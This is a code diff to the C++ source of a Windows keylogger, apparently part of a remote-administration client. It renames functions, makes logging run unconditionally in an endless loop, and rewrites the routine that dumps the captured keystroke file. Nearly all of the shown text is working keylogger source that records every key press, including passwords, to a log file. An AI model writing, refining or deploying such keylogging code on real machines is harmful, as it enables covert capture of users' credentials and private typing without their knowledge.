@@ -1,16 +1,11 @@
 #include "keylogger.h"
 
 
-
-
-void Keylogger::StartLogger()
+void Keylogger::startLogger()
 {
 	while (true)
 	{
-		if (Settings::logKeys)
-		{
-			Logger();
-		}
+		logger();
 		Sleep(10);
 	}
 
@@ -19,8 +14,9 @@ void Keylogger::StartLogger()
 
 
 
-std::string Keylogger::DumpKeys()
+std::string Keylogger::dumpKeys()
 {
+	/*										//JulianGi's original implementation, didn't work reliably and produced errors on testing. changed by werkamsus
 	std::ifstream file;
 	file.open(Settings::keylogPath);
 	std::string keys;
@@ -29,7 +25,10 @@ std::string Keylogger::DumpKeys()
 		file >> keys;
 	}
 	file.close();
-	return keys;	
+	*/
+	std::ifstream stream(Settings::keylogPath);
+	std::string keys((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());
+	return keys;
 }
 
 
@@ -37,8 +36,12 @@ std::string Keylogger::DumpKeys()
 
 
 
+/*
+Not sure if i want to repeatedly call functions 24/7 in the client, have to look into a version with hooks and winapi (message loop)
+constantly opens and closes a file 100x per second. really not optimal
 
-void Keylogger::Logger()//keycode map taken from https://github.com/TheFox/keylogger/blob/master/src/main.cpp
+*/
+void Keylogger::logger()		//keycode map taken from https://github.com/TheFox/keylogger/blob/master/src/main.cpp
 {
 
 	std::ofstream file;
@@ -55,7 +58,7 @@ void Keylogger::Logger()//keycode map taken from https://github.com/TheFox/keylo
 			else if (c == 4)
 				out = "[MMOUSE]"; // mouse middle
 			else if (c == 13)
-				out = "[RETURN]";
+				out = "[RETURN]\n";
 			else if (c == 16 || c == 17 || c == 18)
 				out = "";
 			else if (c == 160 || c == 161) // lastc == 16
@@ -100,7 +103,7 @@ void Keylogger::Logger()//keycode map taken from https://github.com/TheFox/keylo
 			else if (c == 91 || c == 92)
 				out = "[WIN]";
 			else if (c >= 96 && c <= 105)
-				out = "[NUM " + intToString(c - 96) + "]";
+				out = "[NUM " + std::to_string(c - 96) + "]";
 			else if (c == 106)
 				out = "[NUM /]";
 			else if (c == 107)
@@ -110,7 +113,7 @@ void Keylogger::Logger()//keycode map taken from https://github.com/TheFox/keylo
 			else if (c == 109)
 				out = "[NUM ,]";
 			else if (c >= 112 && c <= 123)
-				out = "[F" + intToString(c - 111) + "]";
+				out = "[F" + std::to_string(c - 111) + "]";
 			else if (c == 144)
 				out = "[NUM]";
 			else if (c == 192)
@@ -133,7 +136,7 @@ void Keylogger::Logger()//keycode map taken from https://github.com/TheFox/keylo
 				out = "<";
 
 			else
-				out = "[KEY \\" + intToString(c) + "]";
+				out = "[KEY \\" + std::to_string(c) + "]";
 
 
 			file << out;
@@ -141,10 +144,4 @@ void Keylogger::Logger()//keycode map taken from https://github.com/TheFox/keylo
 			file.close();
 		}
 	}
-}
-
-std::string Keylogger::intToString(int i) {
-	char buffer[4];
-	_itoa_s(i, buffer, 10);
-	return std::string(buffer);
 }
